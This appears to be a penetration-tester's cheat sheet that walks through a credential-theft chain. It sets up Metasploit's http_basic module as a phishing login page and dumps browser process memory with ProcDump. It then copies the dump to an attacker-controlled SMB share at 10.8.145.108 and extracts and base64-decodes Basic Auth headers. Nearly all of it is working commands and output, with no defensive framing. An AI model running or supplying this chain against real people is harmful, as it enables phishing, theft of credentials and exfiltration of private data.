# Metasploit

## 01 - Usage

- MSF HTTP Client Basic Authentication Credential Collector Auxiliary Module

```
msf > use auxiliary/server/capture/http_basic

msf auxiliary(server/capture/http_basic) > options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server


msf auxiliary(server/capture/http_basic) > set uripath [/uri_path]

msf auxiliary(server/capture/http_basic) > set srvhost <IP>

msf auxiliary(server/capture/http_basic) > set srvport <PORT>

msf auxiliary(server/capture/http_basic) > set ssl <true | false>

msf auxiliary(server/capture/http_basic) > set sslcert </path/to/cert.pem>

msf auxiliary(server/capture/http_basic) > set realm <realm_name>

msf auxiliary(server/capture/http_basic) > set redirectURL <url>

msf auxiliary(server/capture/http_basic) > run
```

## 02 - Use Case

### 2.1 - Phishing

```
msf6 > use auxiliary/server/capture/http_basic

msf6 auxiliary(server/capture/http_basic) > options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server


msf6 auxiliary(server/capture/http_basic) > set srvhost 10.8.145.108
srvhost => 10.8.145.108
msf6 auxiliary(server/capture/http_basic) > set uripath /login
uripath => /login
msf6 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 3.
[*] Using URL: http://10.8.145.108/login
[*] Server started.
```

- Wait for the target to interact to the phishing link to pass the credentials.

![[01 - Realm.png]]

### 2.2 - Dump Credentials

#### 2.2.1 - Task Manager

- Create dump file

![[02 - Create Dump File.png]]

![[03 - Memory Dump File Saved.png]]

#### 2.2.2 - Sysinternal ProcDump

```
C:\Users\user> tasklist /svc

C:\Users\user> procdump.exe /accepteula -ma iexplore.exe C:\Users\user\AppData\Local\Temp\iexplore.dmp
```

### 2.3 - Exfiltrate Credentials

```
$ sudo smbserver.py share $(pwd)

C:\Users\user>copy C:\Users\user\AppData\Local\Temp\iexplore.dmp \\10.8.145.108\share\
The specified network name is no longer available.
        1 file(s) copied.

$ ls -lh
total 100M
-rw-r--r-- 1 user user 100M May 29 16:41 iexplore.dmp
```

### 2.4 - Extract Credentials

```
$ strings iexplore.DMP | grep "Authorization: Basic"

$ echo -ne <base64_string> | base64 -d
```

---
## References

- [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)